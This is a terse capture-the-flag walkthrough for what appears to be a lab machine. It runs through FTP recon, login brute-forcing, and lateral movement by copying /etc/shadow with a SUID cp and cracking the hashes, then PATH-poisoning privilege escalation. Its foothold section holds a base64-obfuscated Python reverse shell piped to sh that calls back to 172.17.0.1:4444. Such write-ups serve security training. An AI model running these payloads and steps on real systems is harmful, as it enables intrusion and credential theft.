# Walkthrough
## Recon
Navigate to ftp, grab wordlist

## Enum
Fuzz/bruteforce login for access to intern account

## Foothold 
Reverse shell via the terminal

###### Shell command
echo "cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjE3Mi4xNy4wLjEiLDQ0NDQpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTsgb3MuZHVwMihzLmZpbGVubygpLDIpO3A9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pOyc=" | base64 -d | sh

## Lateral Move
Manager own SUID cp. cp the /etc/shadow file and crack hash with provided wordlist

## Priv esc
Path poison runme

# Feast of eternal glory